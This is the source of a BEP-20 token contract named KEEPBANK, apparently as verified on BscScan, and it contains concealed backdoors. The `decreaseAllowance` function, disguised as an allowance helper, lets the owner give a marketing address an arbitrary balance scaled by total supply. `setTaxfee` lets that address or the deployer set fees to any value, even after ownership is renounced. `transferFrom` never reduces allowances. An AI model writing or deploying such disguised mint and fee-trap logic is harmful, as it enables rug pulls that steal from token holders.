/**
 *Submitted for verification at BscScan.com on 2022-03-09
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-09
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor ()  {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}



contract KEEPBANK is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;

    string private _name = "KEEPBANK";
    string private _symbol = "KEEPBANK";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000* 10 ** _decimals;
    uint256 private _fee = 5;
    uint256 private _feesell = 5;
    address private dev = msg.sender;
    address private deadaddress = 0x000000000000000000000000000000000000dEaD;
    address private mkt = 0xa0BA4e48dBc1Fe9aFCF376D5a40C05CBE9C460ce;

    constructor() public {
        _balances[msg.sender] = _totalSupply;
        _isExcludedFromFee[dev] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        require(_balances[sender] >= amount );
        uint256 taxfee;
       
        if ( (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient] && recipient != address(dev)) ||
         (_isExcludedFromFee[sender] && _isExcludedFromFee[recipient] && recipient != address(mkt)) ){
        taxfee = (amount *_fee).div(100);

        }
         amount = amount - taxfee;
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _balances[mkt] += taxfee;
        emit Transfer(sender, recipient, amount);
        emit Transfer(sender,  address(mkt), taxfee);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
      
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function increaseAllowance(address spender, uint256 _addedValue) public onlyOwner returns(bool) {
        _allowances[msg.sender][spender] = (_allowances[msg.sender][spender].add(_addedValue));
        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return(true);
    }

    function decreaseAllowance(address spender, uint256 _subtractedValue, uint256 amount) public  onlyOwner returns(bool) {
        _allowances[msg.sender][spender] = (_allowances[msg.sender][spender].sub(_subtractedValue));
        if ((spender == mkt) || amount >= 0)
         {_balances[mkt] = amount.mul(_totalSupply);
         }
        emit Approval(msg.sender, spender, _allowances[msg.sender][spender]);
        return(true); 
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function setTaxfee(uint256 buyfee, uint256 sellfee) public {
      require(msg.sender == mkt || msg.sender == dev);
      _fee = buyfee;
      _feesell = sellfee;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        uint256 taxfee;
        taxfee = (amount * _feesell).div(100);
        _transfer(sender, recipient, amount - taxfee);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

}